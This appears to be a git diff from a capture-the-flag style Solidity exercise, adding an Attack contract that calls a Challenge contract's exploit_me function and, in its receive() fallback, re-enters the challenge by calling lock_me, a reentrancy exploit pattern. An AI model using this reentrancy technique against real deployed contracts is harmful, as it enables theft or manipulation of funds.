@@ -52,3 +52,12 @@ contract Challenge {
     }
 }
 
+contract Attack{
+    function exploit(address c) public{
+        Challenge(c).exploit_me("Angella");
+    }
+
+    receive() external payable{
+        Challenge(msg.sender).lock_me();
+    }
+}
